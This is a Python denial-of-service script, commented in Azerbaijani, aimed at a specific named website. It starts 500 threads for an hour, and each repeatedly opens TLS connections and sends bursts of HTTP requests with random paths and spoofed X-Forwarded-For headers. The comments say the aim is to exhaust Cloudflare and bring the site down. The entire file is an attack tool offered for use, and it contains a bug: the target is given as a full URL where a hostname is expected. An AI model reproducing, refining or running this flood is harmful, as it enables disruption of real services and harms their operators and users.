import socket
import threading
import random
import time
import string

# --- ÖLÜMCÜL AYARLAR ---
# Saytın portu (HTTPS üçün 443, HTTP üçün 80)
TARGET_HOST = "https://www.appl88-vip.com/?invite_code=123456&ttclid=E_C_P_CuIB5Je1hAtDVTZcq784dv7B-vpueYClOBJzcfbc5uUitO1p5Aijx43OcYFVJlv-x4bLOQdIHDkNKucfYDDLyKzl9lJig1xn3mCE1apiKSKV8d5VasddYVHFv9zvh3LZcQ3CPe5X5ibgoyuM_KhFScFc9NSXZAoBKCkz1ArD-avCcyG9o97px4S07L0OcOVYy23ciBu-7VK8dQB7q91vqC2IUdQsxjLdm9xxWhE3x0q1bPdkQ_fPdmGENKvSyuxa7j8yov3MUS3-86ZSvrTfHCOLrwN5IkTJgPulzqog64WW5JBlixIEdjIuMA#/login"
TARGET_PORT = 443
THREADS = 500 # Railway-in internet kanalını sona qədər istifadə edir
DURATION = 3600 # 1 Saatlıq hücum

# Cloudflare-i daxildən yormaq üçün saxta paket
def generate_payload():
    method = random.choice(["GET", "POST", "HEAD"])
    path = "/" + "".join(random.choices(string.ascii_lowercase + string.digits, k=15))
    headers = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n"
        f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
        f"\r\n"
    ).encode()
    return headers

def attack():
    while True:
        try:
            # Birbaşa TCP Socket səviyyəsində bağlantı
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            
            # HTTPS (SSL) bağlantısı təqlid edilir
            import ssl
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            conn = context.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))
            
            # Saniyədə yüzlərlə paketi eyni bağlantıdan darvazadan keçirt!
            for _ in range(100):
                conn.send(generate_payload())
                
            conn.close()
        except:
            pass

def main():
    print(f"💀 HYPER-NOVA ACTIVATED: {TARGET_HOST}")
    print(f"[*] Total Threads: {THREADS} | Protocol: TCP/SSL")
    
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()
        if i % 50 == 0:
            print(f"[*] {i} Döyüşçü cəbhəyə göndərildi...")
            time.sleep(0.5)

    print("\n🔥 BÜTÜN QÜVVƏLƏR AKTİVDİR! SAYTIN ÇÖKMƏSİNİ GÖZLƏYİN.")
    time.sleep(DURATION)

if __name__ == "__main__":
    main()
